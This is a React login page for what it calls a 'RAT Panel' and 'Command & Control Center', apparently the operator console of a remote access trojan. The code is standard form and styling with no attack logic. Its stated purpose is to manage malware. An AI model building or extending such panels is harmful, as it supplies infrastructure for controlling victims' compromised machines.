import React, { useState } from 'react';
import { useAuth } from '../services/AuthContext';
import { useNavigate } from 'react-router-dom';
import {
  FiLock,
  FiMail,
  FiAlertCircle,
  FiLoader,
  FiEye,
  FiEyeOff,
  FiShield,
  FiTerminal,
} from 'react-icons/fi';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [focusedField, setFocusedField] = useState(null);
  const { login, error } = useAuth();
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const success = await login(email, password);
    setLoading(false);
    if (success) {
      navigate('/', { replace: true });
    }
  };

  return (
    <div className="min-h-screen bg-dark-900 flex items-center justify-center px-4 relative overflow-hidden">
      {/* Background decorative elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {/* Gradient orb top-right */}
        <div className="absolute -top-40 -right-40 w-96 h-96 bg-primary-600/10 rounded-full blur-3xl" />
        {/* Gradient orb bottom-left */}
        <div className="absolute -bottom-40 -left-40 w-96 h-96 bg-purple-600/10 rounded-full blur-3xl" />
        {/* Grid pattern overlay */}
        <div
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)`,
            backgroundSize: '60px 60px',
          }}
        />
      </div>

      <div className="w-full max-w-md relative z-10">
        {/* Logo & Header */}
        <div className="text-center mb-10">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-primary-500 to-primary-700 rounded-2xl mb-6 shadow-lg shadow-primary-600/25 group hover:shadow-primary-600/40 transition-shadow duration-300">
            <FiShield className="text-4xl text-white transform group-hover:scale-110 transition-transform duration-300" />
          </div>
          <h1 className="text-3xl font-bold text-white tracking-tight">RAT Panel</h1>
          <p className="text-gray-500 mt-2 flex items-center justify-center gap-2">
            <FiTerminal className="text-sm" />
            Command & Control Center
          </p>
        </div>

        {/* Login Card */}
        <div className="bg-dark-800/80 backdrop-blur-xl border border-dark-700/50 rounded-2xl p-8 shadow-2xl">
          {/* Decorative top bar */}
          <div className="h-1 w-16 bg-gradient-to-r from-primary-500 to-primary-400 rounded-full mx-auto mb-8" />

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Error Message */}
            {error && (
              <div className="bg-red-900/20 border border-red-800/40 text-red-400 px-4 py-3.5 rounded-xl text-sm flex items-start gap-3 animate-in fade-in slide-in-from-top-2 duration-200">
                <FiAlertCircle className="flex-shrink-0 mt-0.5 text-lg" />
                <div className="flex-1">
                  <p className="font-medium">Authentication failed</p>
                  <p className="text-red-400/80 text-xs mt-0.5">{error}</p>
                </div>
              </div>
            )}

            {/* Email Field */}
            <div className="space-y-1.5">
              <label
                className={`text-sm font-medium transition-colors duration-200 ${
                  focusedField === 'email' ? 'text-primary-400' : 'text-gray-400'
                }`}
              >
                Email Address
              </label>
              <div className="relative group">
                <div className={`absolute left-3.5 top-1/2 -translate-y-1/2 transition-colors duration-200 ${
                  focusedField === 'email' ? 'text-primary-400' : 'text-gray-600 group-hover:text-gray-400'
                }`}>
                  <FiMail className="text-lg" />
                </div>
                <input
                  type="email"
                  className={`w-full px-4 py-3.5 pl-12 bg-dark-900/80 border-2 rounded-xl text-gray-100 placeholder-gray-600 transition-all duration-200 outline-none ${
                    focusedField === 'email'
                      ? 'border-primary-500/60 ring-2 ring-primary-500/20 shadow-sm shadow-primary-500/10'
                      : 'border-dark-600/60 hover:border-dark-500/60 focus:border-primary-500/60 focus:ring-2 focus:ring-primary-500/20'
                  }`}
                  placeholder="admin@ratpanel.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onFocus={() => setFocusedField('email')}
                  onBlur={() => setFocusedField(null)}
                  required
                  autoFocus
                  autoComplete="email"
                />
              </div>
            </div>

            {/* Password Field */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between">
                <label
                  className={`text-sm font-medium transition-colors duration-200 ${
                    focusedField === 'password' ? 'text-primary-400' : 'text-gray-400'
                  }`}
                >
                  Password
                </label>
              </div>
              <div className="relative group">
                <div className={`absolute left-3.5 top-1/2 -translate-y-1/2 transition-colors duration-200 ${
                  focusedField === 'password' ? 'text-primary-400' : 'text-gray-600 group-hover:text-gray-400'
                }`}>
                  <FiLock className="text-lg" />
                </div>
                <input
                  type={showPassword ? 'text' : 'password'}
                  className={`w-full px-4 py-3.5 pl-12 pr-12 bg-dark-900/80 border-2 rounded-xl text-gray-100 placeholder-gray-600 transition-all duration-200 outline-none ${
                    focusedField === 'password'
                      ? 'border-primary-500/60 ring-2 ring-primary-500/20 shadow-sm shadow-primary-500/10'
                      : 'border-dark-600/60 hover:border-dark-500/60 focus:border-primary-500/60 focus:ring-2 focus:ring-primary-500/20'
                  }`}
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setFocusedField('password')}
                  onBlur={() => setFocusedField(null)}
                  required
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute right-3.5 top-1/2 -translate-y-1/2 transition-colors duration-200 ${
                    showPassword ? 'text-primary-400' : 'text-gray-600 hover:text-gray-400'
                  }`}
                  tabIndex={-1}
                >
                  {showPassword ? <FiEyeOff className="text-lg" /> : <FiEye className="text-lg" />}
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className="btn-primary w-full py-3.5 text-base font-semibold rounded-xl relative overflow-hidden group disabled:opacity-70"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <FiLoader className="animate-spin text-xl" />
                  <span>Signing in...</span>
                </span>
              ) : (
                <span className="flex items-center justify-center gap-2">
                  <FiLock className="text-lg" />
                  <span>Sign In</span>
                </span>
              )}
              {/* Hover shimmer effect */}
              {!loading && (
                <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700 bg-gradient-to-r from-transparent via-white/10 to-transparent" />
              )}
            </button>
          </form>

          {/* Footer */}
          <div className="mt-8 pt-6 border-t border-dark-700/50 text-center">
            <div className="flex items-center justify-center gap-2 text-xs text-gray-600">
              <FiShield className="text-sm" />
              <span>Secured with end-to-end encryption</span>
            </div>
            {/* <p className="text-xs text-gray-700 mt-2">
              Static credentials configured in server .env
            </p> */}
          </div>
        </div>

        {/* Version footer */}
        <p className="text-center text-xs text-gray-700 mt-6">
          RAT Panel v1.0.0 • All data is encrypted in transit
        </p>
      </div>
    </div>
  );
}